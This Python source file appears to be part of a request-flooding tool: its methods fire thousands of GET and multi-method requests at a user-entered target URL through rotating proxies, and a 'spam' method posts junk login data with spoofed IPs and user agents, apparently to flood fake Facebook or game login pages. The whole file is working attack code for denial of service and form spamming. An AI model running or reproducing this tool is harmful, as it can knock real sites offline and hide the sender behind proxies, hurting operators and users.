import random, chalk, os, asyncio, math
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
from concurrent.futures import ThreadPoolExecutor
from time import perf_counter
from src.utils.functions import xhr, checkValidUrl, get_proxies, random_str, random_id, random_ip, random_user_agent
from src.utils.io import log, question
from src.constants.paths import PATH_PROGRAM

class Thread:
    @staticmethod
    def test_proxies ():
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        url = "https://google.com"
        
        def func (proxy):
            methods = ["head"]
            
            try:
                for method in methods:
                    output = xhr(method, url, proxies={
                      "http": proxy,
                    })
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(func, proxies)
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def basic ():
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.basic()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["get"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ iteration + 1 }/{ total if total < 1000**4 else '∞' } - { math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def all_requests ():
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.all_requests()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["head", "get", "post", "delete", "patch", "put"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ iteration + 1 }/{ total if total < 1000**4 else '∞' } - { math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def spam (url, total):
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        
        def func (iteration):
            methods = ["post"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                data = {
                  "user": f"{ random_str(100) }@gmail.com",
                  "pass": random_str(1000),
                  #"playid": random_id(9),
                  #"nick": random_str(9),
                  #"epass": "pernah",
                  #"tier": random.choice(["Bronze", "Master", "Silver", "Gold", "Platinum", "Grandmaster", "Diamond"]),
                  "login": "Facebook",
                  "submit": "true",
                  "ua": random_user_agent(),
                  "ip": random_ip(),
                }
                for method in methods:
                    output = xhr(method, url, proxies=proxy, data=data)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ iteration + 1 }/{ total if total < 1000**4 else '∞' } - { math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")